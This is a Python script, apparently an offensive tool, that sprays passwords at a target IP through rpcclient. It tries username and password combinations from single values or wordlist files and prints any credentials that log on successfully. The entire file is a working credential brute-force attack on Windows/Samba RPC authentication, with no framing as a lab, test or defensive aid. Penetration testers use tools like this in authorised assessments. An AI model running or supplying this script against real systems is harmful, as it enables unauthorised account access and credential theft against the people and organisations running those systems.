import subprocess
import argparse
from termcolor import colored

def rpcclient(ip, username, password):
    print(f"RPC command: rpcclient -U {username}%{password}")
    try:
        output = subprocess.check_output(
            ["rpcclient", "-U", f"{username}%{password}", "-c", "getusername;quit", ip],
            stderr=subprocess.STDOUT,
            universal_newlines=True  # Use universal_newlines instead of text for compatibility
        )
        return True, username, password
    except subprocess.CalledProcessError:
        # Ignore logon failures and continue with the next password
        return False, None, None

def main():
    parser = argparse.ArgumentParser(description='RPC Client Password Sprayer')
    parser.add_argument('-u', '--single-user', help='Single username to test (required)')
    parser.add_argument('-U', '--user-list', help='File containing list of usernames separated by newline characters (optional)')
    parser.add_argument('-p', '--single-password', help='Single password to test (required)')
    parser.add_argument('-P', '--password-list', help='File containing list of passwords separated by newline characters (optional)')
    parser.add_argument('-i', '--ip-address', required=True, help='IP address to target')
    parser.add_argument('-c', '--continue-on-success', action='store_true', default=False, help='Continue testing even if a successful logon is found')
    args = parser.parse_args()

    if not (args.single_user or args.user_list):
        print("Error: You must provide either -u or -U")
        return

    if not (args.single_password or args.password_list):
        print("Error: You must provide either -p or -P")
        return

    users = []
    if args.single_user:
        users.append(args.single_user)
    elif args.user_list:
        with open(args.user_list, 'r') as f:
            users.extend(line.strip() for line in f)

    passwords = []
    if args.single_password:
        passwords.append(args.single_password)
    elif args.password_list:
        with open(args.password_list, 'r') as f:
            passwords.extend(line.strip() for line in f)

    successful_logon_found = False

    for user in users:
        for password in passwords:
            success, username, password = rpcclient(args.ip_address, user, password)
            if success:
                successful_logon_found = True
                print(colored(f"[!] Successful logon credentials: {username}:{password}", 'yellow'))
                if not args.continue_on_success:
                    print(colored("[!] Logon attempt stopped due to successful result", 'yellow'))
                    return

if __name__ == "__main__":
    main()
